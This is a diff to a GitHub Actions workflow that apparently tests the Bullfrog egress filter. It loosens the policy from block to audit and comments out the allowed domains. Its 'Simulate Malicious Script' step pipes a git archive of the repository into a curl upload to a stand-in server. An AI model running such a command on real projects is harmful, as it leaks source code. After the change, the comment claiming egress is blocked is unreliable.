@@ -31,8 +31,9 @@ jobs:
         uses: bullfrogsec/bullfrog@v0
         with:
           allowed-domains: |
-            example.com
-          egress-policy: block
+            # example.com
+            # *.docker.com
+          egress-policy: audit
 
       - name: Simulate Legitimate HTTP Requests
         run: |
@@ -41,6 +42,6 @@ jobs:
 
       - name: Simulate Malicious Script
         run: |
-          echo "Creating an archive of the HEAD of the git repo and uploading it to a malicious server"
+          echo "Creating an  archive of the HEAD of the git repo and uploading it to a malicious server"
           git archive HEAD | curl -X POST -H "Content-Type: application/octet-stream" --data-binary @- https://jsonplaceholder.typicode.com/git-repo
           # This line is not reached due to blocked egress
